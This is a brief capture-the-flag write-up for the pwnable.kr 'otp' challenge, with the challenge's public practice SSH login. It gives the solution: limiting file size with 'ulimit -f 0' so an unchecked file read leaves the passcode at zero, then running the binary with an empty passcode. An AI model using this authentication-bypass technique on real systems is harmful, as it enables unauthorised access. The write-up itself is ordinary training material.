# pwnable.kr -- Rookiss -- otp
Actually, the program do not check whether it does read `passcode`.

So just use `ulimit -f 0` to forbid program write any bytes and `passcode` will must be `0`.

## 1. Challenge
  > I made a skeleton interface for one time password authentication system.  
  > I guess there are no mistakes.  
  > could you take a look at it?  
  >   
  > hint : not a race condition. do not bruteforce.  
  >   
  > ssh otp@pwnable.kr -p2222 (pw:guest)  

## 2. Solution
  * Connect via SSH, then:

    ```bash
    $ ulimit -f 0
    $ python -c "import subprocess; subprocess.Popen(['/home/otp/otp', '']); exit()"
    ```

    You will get the flag.
